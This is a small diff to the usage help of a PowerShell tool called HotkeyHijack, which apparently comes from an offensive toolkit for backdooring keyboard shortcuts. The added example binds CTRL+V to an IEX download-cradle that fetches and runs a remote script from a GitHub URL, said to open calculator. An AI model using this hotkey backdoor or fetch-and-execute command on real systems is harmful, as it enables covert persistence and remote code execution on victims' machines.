@@ -17,6 +17,8 @@ Function HotkeyHijack {
 
     .EXAMPLE
     
+    By default, "CAPS LOCK" is backdoored to launch calculator. The "HotKey" parameter can be specified to execute a custom command.
+    Shown below is the command to backdoor "CTRL+V" to fetch a remote script - in this case, runs calculator.
     HotkeyHijack -HotKey "CTRL+V" -Command "IEX([net.webclient]::new().downloadstring('https://raw.githubusercontent.com/huntr-huntr/Cache/main/scripts/calc.txt'))"
 
     .NOTES
